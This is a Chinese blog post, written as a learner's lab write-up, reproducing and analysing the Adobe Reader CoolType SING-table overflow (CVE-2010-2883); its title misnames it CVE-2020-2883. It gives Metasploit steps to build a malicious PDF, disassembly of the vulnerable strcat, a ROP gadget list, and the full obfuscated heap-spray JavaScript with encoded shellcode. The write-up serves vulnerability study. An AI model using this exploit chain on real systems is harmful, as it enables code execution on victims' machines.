<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  
  <title>初次尝试，CVE-2020-2883复现与分析 | Rabbit hole | We don&#39;t choose who we are, but we do choose who we become.</title>

  
  <meta name="author" content="MEssa_Rabbit">
  

  
  <meta name="description" content="菜狗一个">
  

  
  
  <meta name="keywords" content="笔记,CVE,漏洞复现">
  

  <meta id="viewport" name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black">

  <meta property="og:title" content="初次尝试，CVE-2020-2883复现与分析"/>

  <meta property="og:site_name" content="Rabbit hole"/>

  
  <meta property="og:image" content="/favicon.ico"/>
  

  <link href="/favicon.ico" rel="icon">
  <link rel="alternate" href="/atom.xml" title="Rabbit hole" type="application/atom+xml">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
<meta name="generator" content="Hexo 5.4.0"></head>


<body>
<div class="blog">
  <div class="content">

    <header>
  <div class="site-branding">
    <h1 class="site-title">
      <a href="/">Rabbit hole</a>
    </h1>
    <p class="site-description">We don&#39;t choose who we are, but we do choose who we become.</p>
  </div>
  <nav class="site-navigation">
    <ul>
      
    </ul>
  </nav>
</header>

    <main class="site-main posts-loop">
    <article>

  
    
    <h3 class="article-title"><span>初次尝试，CVE-2020-2883复现与分析</span></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2022/04/27/初次尝试，CVE-2020-2883复现与分析/" rel="bookmark">
        <time class="entry-date published" datetime="2022-04-27T09:01:20.000Z">
          2022-04-27
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <p>个人复现的第一个漏洞，从《漏洞战争》一书和别人的复现分析中学到了许多。</p>
<span id="more"></span>

<h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><p><a target="_blank" rel="noopener" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2010-2883">官方文档</a></p>
<blockquote>
<p>Stack-based buffer overflow in CoolType.dll in Adobe Reader and Acrobat 9.x before 9.4, and 8.x before 8.2.5 on Windows and Mac OS X, allows remote attackers to execute arbitrary code or cause a denial of service (application crash) via a PDF document with a long field in a Smart INdependent Glyphlets (SING) table in a TTF font, as exploited in the wild in September 2010. NOTE: some of these details are obtained from third party information.<br>References</p>
</blockquote>
<p>该漏洞是 Adobe Reader 和 Acrobat 的 CoolType.dll 库在解析字体文件SING表中的uniqueName项时存在的栈溢出漏洞。</p>
<h2 id="msf复现"><a href="#msf复现" class="headerlink" title="msf复现"></a>msf复现</h2><h3 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h3><table>
<thead>
<tr>
<th align="left"></th>
<th align="left"></th>
</tr>
</thead>
<tbody><tr>
<td align="left">虚拟机</td>
<td align="left">VMWare</td>
</tr>
<tr>
<td align="left">攻击机环境</td>
<td align="left">kali linux</td>
</tr>
<tr>
<td align="left">靶机环境</td>
<td align="left">Windows XP SP3</td>
</tr>
</tbody></table>
<h3 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h3><h4 id="搜索模块"><a href="#搜索模块" class="headerlink" title="搜索模块"></a>搜索模块</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; search cve-2010-2883</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   #  Name                                            Disclosure Date  Rank   Check  Description</span><br><span class="line">   -  ----                                            ---------------  ----   -----  -----------</span><br><span class="line">   0  exploit/windows/browser/adobe_cooltype_sing     2010-09-07       great  No     Adobe CoolType SING Table &quot;uniqueName&quot; Stack Buffer Overflow</span><br><span class="line">   1  exploit/windows/fileformat/adobe_cooltype_sing  2010-09-07       great  No     Adobe CoolType SING Table &quot;uniqueName&quot; Stack Buffer Overflow</span><br></pre></td></tr></table></figure>

<p>结果有两个，一个是基于浏览器的，一个是基于软件的，我们选择基于软件的，也就是第二个。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use exploit/windows/fileformat/adobe_cooltype_sing</span><br></pre></td></tr></table></figure>

<h4 id="设置payload"><a href="#设置payload" class="headerlink" title="设置payload"></a>设置payload</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(windows/fileformat/adobe_cooltype_sing) &gt; set payload windows/exec </span><br><span class="line">payload =&gt; windows/exec</span><br><span class="line">msf6 exploit(windows/fileformat/adobe_cooltype_sing) &gt; set CMD calc.exe</span><br><span class="line">CMD =&gt; calc.exe</span><br></pre></td></tr></table></figure>

<p>让我们最后能弹出计算器</p>
<h4 id="设置并生成PDF"><a href="#设置并生成PDF" class="headerlink" title="设置并生成PDF"></a>设置并生成PDF</h4><figure class="highlight plaintext"><figcaption><span>exploit(windows/fileformat/adobe_cooltype_sing) > set FILENAME test.pdf</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">FILENAME =&gt; test.pdf                                                                                                                                                                                                                         </span><br><span class="line">msf6 exploit(windows/fileformat/adobe_cooltype_sing) &gt; exploit                                                                                                                                                                               </span><br><span class="line">                                                                                                                                                                                                                                             </span><br><span class="line">[*] Creating &#x27;test.pdf&#x27; file...                                                                                                                                                                                                              </span><br><span class="line">[+] test.pdf stored at /home/rabbit/.msf4/local/test.pdf</span><br></pre></td></tr></table></figure>

<p>然后我们将该文件放入靶机并打开</p>
<p><img src="https://s2.loli.net/2022/04/26/jR6UBirCG47VnXf.png" alt="结果"></p>
<p>成功打开了计算器</p>
<h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><h3 id="分析环境"><a href="#分析环境" class="headerlink" title="分析环境"></a>分析环境</h3><table>
<thead>
<tr>
<th align="left"></th>
<th align="left"></th>
</tr>
</thead>
<tbody><tr>
<td align="left">操作系统</td>
<td align="left">Windows XP SP3</td>
</tr>
<tr>
<td align="left">虚拟机</td>
<td align="left">VMWare</td>
</tr>
<tr>
<td align="left">调试软件</td>
<td align="left">OllyDbg</td>
</tr>
<tr>
<td align="left">反汇编软件</td>
<td align="left">IDA</td>
</tr>
<tr>
<td align="left">漏洞软件</td>
<td align="left">Adobe Reader 9.3.4</td>
</tr>
</tbody></table>
<h3 id="相关知识"><a href="#相关知识" class="headerlink" title="相关知识"></a>相关知识</h3><h4 id="strcat-函数"><a href="#strcat-函数" class="headerlink" title="strcat 函数"></a>strcat 函数</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">strcat</span><span class="params">(<span class="keyword">char</span> *dest, <span class="keyword">const</span> <span class="keyword">char</span> *src)</span></span>;</span><br></pre></td></tr></table></figure>

<p>strcat 会将参数 src 字符串复制拼接到参数 dest 所指的字符串尾部，与 strcpy 一样是常见的造成栈溢出漏洞产生的危险函数。</p>
<h3 id="基于字符串定位漏洞"><a href="#基于字符串定位漏洞" class="headerlink" title="基于字符串定位漏洞"></a>基于字符串定位漏洞</h3><p>使用IDA反汇编 CoolType.dll 库，搜索文本 SING (ALT+T)查看，因为该字符串是漏洞解析出错的地方</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">……</span><br><span class="line">.rdata:0819DB4C ; const char aSing[]</span><br><span class="line">.rdata:0819DB4C aSing           db &#x27;SING&#x27;,0             ; DATA XREF: sub_8015AD9+D2↑o</span><br><span class="line">.rdata:0819DB4C                                         ; sub_803DCF9+7B↑o ...</span><br><span class="line">……</span><br></pre></td></tr></table></figure>

<p>找到后再单击 x 查看引用。</p>
<p><img src="https://s2.loli.net/2022/04/26/GZrcHXYC94pn5ES.png" alt="查看引用"></p>
<p>根据《软件战争 软件漏洞分析技术揭秘》书中内容，我们逐个排查比对找到对应代码与危险函数strcat。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">……</span><br><span class="line">.text:0803DD74                 push    offset aSing    ; &quot;SING&quot;</span><br><span class="line">.text:0803DD79                 push    edi             ; int</span><br><span class="line">.text:0803DD7A                 lea     ecx, [ebp+108h+var_12C]</span><br><span class="line">.text:0803DD7D                 call    sub_8021B06</span><br><span class="line">.text:0803DD82                 mov     eax, [ebp+108h+var_12C]</span><br><span class="line">.text:0803DD85                 cmp     eax, esi</span><br><span class="line">.text:0803DD85 ;   &#125; // starts at 803DD53</span><br><span class="line">.text:0803DD87 ;   try &#123;</span><br><span class="line">.text:0803DD87                 mov     byte ptr [ebp+108h+var_10C], 2</span><br><span class="line">.text:0803DD8B                 jz      short loc_803DDC4</span><br><span class="line">.text:0803DD8D                 mov     ecx, [eax]</span><br><span class="line">.text:0803DD8F                 and     ecx, 0FFFFh</span><br><span class="line">.text:0803DD95                 jz      short loc_803DD9F</span><br><span class="line">.text:0803DD97                 cmp     ecx, 100h</span><br><span class="line">.text:0803DD9D                 jnz     short loc_803DDC0</span><br><span class="line">.text:0803DD9F</span><br><span class="line">.text:0803DD9F loc_803DD9F:                            ; CODE XREF: sub_803DCF9+9C↑j</span><br><span class="line">.text:0803DD9F                 add     eax, 10h</span><br><span class="line">.text:0803DDA2                 push    eax             ; Source</span><br><span class="line">.text:0803DDA3                 lea     eax, [ebp+108h+Destination]</span><br><span class="line">.text:0803DDA6                 push    eax             ; Destination</span><br><span class="line">.text:0803DDA7                 mov     [ebp+108h+Destination], 0</span><br><span class="line">.text:0803DDAB                 call    strcat</span><br><span class="line">……</span><br></pre></td></tr></table></figure>

<h3 id="具体分析"><a href="#具体分析" class="headerlink" title="具体分析"></a>具体分析</h3><p>我们将该段给反汇编为伪源代码并截取其中关键部分来分析</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">……</span><br><span class="line"><span class="keyword">int</span> v18; <span class="comment">// [esp+44h] [ebp-24h] BYREF</span></span><br><span class="line">……</span><br><span class="line"><span class="keyword">if</span> ( v18 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( !(<span class="keyword">unsigned</span> __int16)*(_DWORD *)v18 || (<span class="keyword">unsigned</span> __int16)*(_DWORD *)v18 == <span class="number">256</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          Destination[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">          <span class="built_in">strcat</span>(Destination, (<span class="keyword">const</span> <span class="keyword">char</span> *)(v18 + <span class="number">0x10</span>));    <span class="comment">//v18指向SING表，0x10为uniqueName相较于SING表的偏移</span></span><br><span class="line">          sub_8001243(Destination);</span><br><span class="line">          v6 = v18;</span><br><span class="line">        &#125;</span><br><span class="line">        v21 = <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">……</span><br></pre></td></tr></table></figure>

<p>很明显，调用 strcat 时并没有对长度进行限制，造成栈溢出。</p>
<h4 id="EXP分析"><a href="#EXP分析" class="headerlink" title="EXP分析"></a>EXP分析</h4><p>我们直接对msf生成的PDF进行分析即可。<a target="_blank" rel="noopener" href="http://www.rabb1t.xyz/2022/04/26/PDF%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/">PDF文件结构</a></p>
<p>使用PdfStreamDumper得到PDF样本中的TTF文件中关于SING表的TableEntry结构数据。</p>
<blockquote>
<p><code>.TTF</code>为后缀的文件被叫做字体文件，其实是一张表，其中包含所有的字体(或合成规则)，</p>
</blockquote>
<p><img src="https://s2.loli.net/2022/04/26/71AKGL84ulnSDFO.png" alt="TTF Font"></p>
<p><img src="https://s2.loli.net/2022/04/26/h5REaAt4j68WxKu.png" alt="find"></p>
<p><img src="https://s2.loli.net/2022/04/26/cxIYeOrilbDSuws.png" alt="SING"></p>
<p>而官方文档给出的对TableEntry结构的定义为：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> struct_SING</span><br><span class="line">&#123;                   <span class="comment">//SING表对应的TableEntry结构</span></span><br><span class="line">  <span class="keyword">char</span> tag[<span class="number">4</span>];      <span class="comment">//标记             &quot;SING&quot;</span></span><br><span class="line">  ULONG checkSun;   <span class="comment">//校验和          0xd9bcc8b5</span></span><br><span class="line">  ULONG offset;     <span class="comment">//相对文件的偏移  0x0000011c</span></span><br><span class="line">  ULONG length;     <span class="comment">//数据长度       0x00001ddf</span></span><br><span class="line">&#125; TableEntry;</span><br></pre></td></tr></table></figure>

<p>依据偏移找到SING表(起始为 0x00000100)</p>
<p><img src="https://s2.loli.net/2022/04/26/c86qBn4t3MzmLX5.png" alt="SING"></p>
<p>接着再偏移0x10，即为uniqueName域(即输入内容的起始为<code>3A B4 18 E5</code>)。执行 strcat 后，会将该部分复制到ebp的指定地址，接下来我们进行动态调试。</p>
<h3 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h3><p>一个小技巧，msf生成pdf前，将文件<code>/usr/share/metasploit-framework/modules/exploits/windows/fileformat/adobe_cooltype_sing.rb</code>，中的第102行注释掉，换成第101行的内容。这可以将exp中的填充字符从随机字符变为’A’。</p>
<p>利用OD调试 Adobe Reader，在刚才找到的引用 SING 表处下断点(F2)，单过执行至 0x803DD85，查看此时寄存器的内容：</p>
<p><img src="https://s2.loli.net/2022/04/26/mwEt91LshxBvcfd.png" alt="register"></p>
<p>此时 EAX 内的内容为 0x48663b4，我们跳转过去看其中内容：</p>
<p><img src="https://s2.loli.net/2022/04/26/ovZ9V2ganjpsG4I.png" alt="OD"></p>
<p>与我们PDF文件中 uniqueName 域中内容对应，这就是程序加载文件内容的地方。待会调用 strcat 时，就会将这块的内容拼接到 Destination 指向的地址。</p>
<p>单过执行至调用 strcat 处(0x803DDAB)，调用 strcat 后查看 Destination 指向的值：</p>
<p><img src="https://s2.loli.net/2022/04/26/sie84KuTDRSX5mM.png" alt="OD"></p>
<p>其中内容已经变为了 uniqueName 域的内容</p>
<p>经过调试，一直跟进到 0x0808B308 再单过就会调出计算器，其内容为 <code>CALL DWORD PTR DS:[EAX]</code>，这就是执行我们ROP指令的地址。然后此时 eax 的值为 0x4A80CB38，查看其中内容：</p>
<p><img src="https://s2.loli.net/2022/04/27/OojmHELgnzUPKIy.png" alt="leave_ret"></p>
<p>其实就是平时栈迁移题里常用的<code>leave_ret</code>指令。此时的 ebp 值为 0x012E4DC，在栈上是</p>
<p><img src="https://s2.loli.net/2022/04/27/AburZOBkgEzmqMh.png" alt="stack"></p>
<p>也就是我们插入的第一个ret地址，我们在这里看看执行时具体会产生什么效果。</p>
<h4 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h4><ul>
<li>首先将栈上的 0x0C0C0C0C 内容赋给ESP，其中内容为 0x4A8063A5，然后ret。执行 0x4A8063A5</li>
</ul>
<p><img src="https://s2.loli.net/2022/04/27/RDP6C3dcY7UKbfJ.png" alt=" 0x4A8063A5"></p>
<ul>
<li>接着弹出栈上内容赋给 ECX，内容为 0x4A8A0000，然后ret，执行 0x4A802196</li>
</ul>
<p><img src="https://s2.loli.net/2022/04/27/Lgmnr4psR5IXfbk.png" alt="0x4A802196"></p>
<ul>
<li>将EAX的值赋给[ECX]，此时EAX为 0x0012E6D0，然后ret，执行 0x4A801F90</li>
</ul>
<p><img src="https://s2.loli.net/2022/04/27/SdPwzRHmsVL4fIT.png" alt="OD"></p>
<p><img src="https://s2.loli.net/2022/04/27/85gaciZpGyKlDhM.png" alt="0x4A801F90"></p>
<ul>
<li>弹出栈上元素赋给EAX，即 0x4A801F90，然后ret，执行 0x4A80B692</li>
</ul>
<p><img src="https://s2.loli.net/2022/04/27/tIn9CTAVpF6JR5Z.png" alt="0x4A80B692"></p>
<ul>
<li>而 0x4A801F90 连接了一个函数<code>CreateFileA</code>，</li>
</ul>
<p><img src="https://s2.loli.net/2022/04/27/BXYdQyw39GVaN8u.png" alt="CreateFileA"></p>
<ul>
<li>调用 CreateFileA，创建了一个名为 iso88591 的文件，然后ret</li>
</ul>
<p><img src="https://s2.loli.net/2022/04/27/VU265KIHGtcJvSR.png" alt="OD"></p>
<p>接着调试发现是一样的过程，只不过调用的函数不同。程序接着调用了 CreateFileMappingA，创建文件内存映射</p>
<p><img src="https://s2.loli.net/2022/04/27/bpfTIHMnAgrSsBk.png" alt="CreateFileMappingA"></p>
<p>还有 MapViewOfFile，将shellcode复制到申请的内存处</p>
<p><img src="https://s2.loli.net/2022/04/27/79QuAEmBDsWrTc5.png" alt="MapViewOfFile"></p>
<p>shellcode 是通过嵌入PDF的JavaScript来写入的，内容可以在 PdfStreamDumper 中看到：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> SRrMvMAOXcbsiGKZawqPShWHOEnYUhlMdTQEhPNhZpeaKOjnYCrGkeTCftz = <span class="built_in">unescape</span>;</span><br><span class="line"><span class="keyword">var</span> gpEWSNKZtZtrDtXDBlCGqjwdCCvqvwmQdNdYQREWutshKgfOzkONtk = SRrMvMAOXcbsiGKZawqPShWHOEnYUhlMdTQEhPNhZpeaKOjnYCrGkeTCftz( <span class="string">&#x27;%u4141%u4141%u63a5%u4a80%u0000%u4a8a%u2196%u4a80%u1f90%u4a80%u903c%u4a84%ub692%u4a80%u1064%u4a80%u22c8%u4a85%u0000%u1000%u0000%u0000%u0000%u0000%u0002%u0000%u0102%u0000%u0000%u0000%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0008%u0000%ua8a6%u4a80%u1f90%u4a80%u9038%u4a84%ub692%u4a80%u1064%u4a80%uffff%uffff%u0000%u0000%u0040%u0000%u0000%u0000%u0000%u0001%u0000%u0000%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0008%u0000%ua8a6%u4a80%u1f90%u4a80%u9030%u4a84%ub692%u4a80%u1064%u4a80%uffff%uffff%u0022%u0000%u0000%u0000%u0000%u0000%u0000%u0001%u63a5%u4a80%u0004%u4a8a%u2196%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0030%u0000%ua8a6%u4a80%u1f90%u4a80%u0004%u4a8a%ua7d8%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0020%u0000%ua8a6%u4a80%u63a5%u4a80%u1064%u4a80%uaedc%u4a80%u1f90%u4a80%u0034%u0000%ud585%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u000a%u0000%ua8a6%u4a80%u1f90%u4a80%u9170%u4a84%ub692%u4a80%uffff%uffff%uffff%uffff%uffff%uffff%u1000%u0000%u80b8%uaf28%udbe6%ud9d1%u2474%u5bf4%uc933%u31b1%u4331%u0313%u1343%uc383%uca84%u1a5a%u886c%ue3a5%ued6c%u062c%u2d5d%u424a%u9dcd%u0618%u56e1%ub34c%u1a72%ub459%u9133%ufbbf%u8ac4%u9afc%ud146%u7cd0%u1a77%u7c25%u47b0%u2cc4%u0369%uc17b%u591e%u6a40%u4f6c%u8fc0%u6e24%u01e1%u293f%ua321%u41ec%ubb68%u6cf1%u3022%u1bc1%u90b5%ue318%udd1a%u1695%u1962%uc911%u5311%u7462%ua022%ua219%u33a7%u21b9%u981f%ue538%u6bc6%u4236%u348c%u555a%u4f41%ude66%u8064%ua4ef%u0442%u7fb4%u1dea%ud110%u7d13%u8efb%uf5b1%uda11%u57cb%u1d7f%ue259%u1dcd%ued61%u7661%u6650%u01ee%uad6d%ufd4b%uec27%u96fd%u64e1%ufabc%u5311%u0282%u5692%uf17a%u128a%ubd7f%uce0c%uae0d%uf0f8%ucfa2%u9328%u5c25%u7ab0%ue4c0%u8353&#x27;</span> );</span><br><span class="line"><span class="keyword">var</span> ZIYuBLsDEDDUlkqwSiwiDlyPpVbxsNRSJNnAENDMYMcaUtLeTqphcLlFOlrChQRontCQPHaQfQgalGiEoyQEGcl = SRrMvMAOXcbsiGKZawqPShWHOEnYUhlMdTQEhPNhZpeaKOjnYCrGkeTCftz( <span class="string">&quot;%&quot;</span> + <span class="string">&quot;u&quot;</span> + <span class="string">&quot;0&quot;</span> + <span class="string">&quot;c&quot;</span> + <span class="string">&quot;0&quot;</span> + <span class="string">&quot;c&quot;</span> + <span class="string">&quot;%u&quot;</span> + <span class="string">&quot;0&quot;</span> + <span class="string">&quot;c&quot;</span> + <span class="string">&quot;0&quot;</span> + <span class="string">&quot;c&quot;</span> );</span><br><span class="line"><span class="keyword">while</span> (ZIYuBLsDEDDUlkqwSiwiDlyPpVbxsNRSJNnAENDMYMcaUtLeTqphcLlFOlrChQRontCQPHaQfQgalGiEoyQEGcl.length + <span class="number">20</span> + <span class="number">8</span> &lt; <span class="number">65536</span>) ZIYuBLsDEDDUlkqwSiwiDlyPpVbxsNRSJNnAENDMYMcaUtLeTqphcLlFOlrChQRontCQPHaQfQgalGiEoyQEGcl+=ZIYuBLsDEDDUlkqwSiwiDlyPpVbxsNRSJNnAENDMYMcaUtLeTqphcLlFOlrChQRontCQPHaQfQgalGiEoyQEGcl;</span><br><span class="line">xhqRDDrTFaPkhbN = ZIYuBLsDEDDUlkqwSiwiDlyPpVbxsNRSJNnAENDMYMcaUtLeTqphcLlFOlrChQRontCQPHaQfQgalGiEoyQEGcl.substring(<span class="number">0</span>, (<span class="number">0x0c0c</span>-<span class="number">0x24</span>)/<span class="number">2</span>);</span><br><span class="line">xhqRDDrTFaPkhbN += gpEWSNKZtZtrDtXDBlCGqjwdCCvqvwmQdNdYQREWutshKgfOzkONtk;</span><br><span class="line">xhqRDDrTFaPkhbN += ZIYuBLsDEDDUlkqwSiwiDlyPpVbxsNRSJNnAENDMYMcaUtLeTqphcLlFOlrChQRontCQPHaQfQgalGiEoyQEGcl;</span><br><span class="line">VmrPkWcbujYqdbZJiVWSIMMnNZUuajPMNDXVukZfeaSvHBnvdKDXfcFypgeqLbG = xhqRDDrTFaPkhbN.substring(<span class="number">0</span>, <span class="number">65536</span>/<span class="number">2</span>);</span><br><span class="line"><span class="keyword">while</span>(VmrPkWcbujYqdbZJiVWSIMMnNZUuajPMNDXVukZfeaSvHBnvdKDXfcFypgeqLbG.length &lt; <span class="number">0x80000</span>) VmrPkWcbujYqdbZJiVWSIMMnNZUuajPMNDXVukZfeaSvHBnvdKDXfcFypgeqLbG += VmrPkWcbujYqdbZJiVWSIMMnNZUuajPMNDXVukZfeaSvHBnvdKDXfcFypgeqLbG;</span><br><span class="line">mLVmRyYrugLJciVQSgzSkPkUFzjzDOKYXQkoytvknMtSifxjImzmzSTeiCuEQPphAUUaPPwqzvKauVkNtTGlsHqWo = VmrPkWcbujYqdbZJiVWSIMMnNZUuajPMNDXVukZfeaSvHBnvdKDXfcFypgeqLbG.substring(<span class="number">0</span>, <span class="number">0x80000</span> - (<span class="number">0x1020</span>-<span class="number">0x08</span>) / <span class="number">2</span>);</span><br><span class="line"><span class="keyword">var</span> TTVHhqJwkQBQtxBZnehysrCfheMgKLPScAahDQdBupbGZfetgTbtisRexcMEZXwfwmcwgapnfnVxiGFHJwuwBYqddyfeF = <span class="keyword">new</span> <span class="built_in">Array</span>();</span><br><span class="line"><span class="keyword">for</span> (BtzHVK=<span class="number">0</span>;BtzHVK&lt;<span class="number">0x1f0</span>;BtzHVK++) TTVHhqJwkQBQtxBZnehysrCfheMgKLPScAahDQdBupbGZfetgTbtisRexcMEZXwfwmcwgapnfnVxiGFHJwuwBYqddyfeF[BtzHVK]=mLVmRyYrugLJciVQSgzSkPkUFzjzDOKYXQkoytvknMtSifxjImzmzSTeiCuEQPphAUUaPPwqzvKauVkNtTGlsHqWo+<span class="string">&quot;s&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>最后调用计算器</p>
<p><img src="https://s2.loli.net/2022/04/27/Bv6CuDKlznyjEqs.png" alt="WinExec"></p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>主要是构造了ROPchain。</p>
<p>使用到的Gadget主要有：</p>
<ul>
<li>0x4A82A714 &gt; <code>pop esp;ret</code></li>
<li>0x4A8063A5 &gt; <code>pop ecx;ret</code></li>
<li>0x4A802196 &gt; <code>mov dword ptr ds:[ecx],eax;ret</code></li>
<li>0x4A80CB38 &gt; <code>add ebp,794;leave;ret</code></li>
<li>0x4A801F90 &gt; <code>pop eax;ret</code></li>
<li>0x4A80B692 &gt; <code>jmp dword ptr ds:[eax]</code></li>
<li>0x4A842DB2 &gt; <code>xchg eax,edi;ret</code></li>
<li>0x4A801064 &gt; <code>ret</code></li>
<li>……</li>
</ul>
<p>再来看EXP可以很明显的看见其中的gadget</p>
<p><img src="https://s2.loli.net/2022/04/27/WhjETCo8p4i3NtB.png" alt="EXP"></p>
<p>利用这些gadget和嵌入文件的JS代码，将shellcode写入文件的可执行段(绕过DEP)，也就是我们调用 CreateFile 等函数的所申请的内存空间，最后执行。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener" href="https://blog.joe1sn.top/2020/10/06/%E5%88%9D%E5%AD%A6CVE-2010-2883%E6%BC%8F%E6%B4%9E%E8%B0%83%E8%AF%95%E5%8F%8A%E5%A4%8D%E7%8E%B0/">初学CVE-2010-2883漏洞调试及复现</a></p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/179681">细说CVE-2010-2883从原理分析到样本构造 </a></p>
<p>《软件战争 软件漏洞分析技术揭秘》 2.3 CVE-2010-2883 Adobe Reader TTF字体SING表栈溢出漏洞</p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    

    
    

    <span class="post-tags">
      <i class="icon-tags"></i>
        <a href="/tags/笔记/">笔记</a><a href="/tags/CVE/">CVE</a><a href="/tags/漏洞复现/">漏洞复现</a>
    </span>
    

    </div>

    
  </div>
</article>

  









    </main>

    <footer class="site-footer">
  <p class="site-info">
    Proudly powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and
    Theme by <a href="https://github.com/CodeDaraW/Hacker" target="_blank">Hacker</a>
    </br>
    
    &copy; 2023 MEssa_Rabbit
    
  </p>
</footer>
    
    
  </div>
</div>
</body>
</html>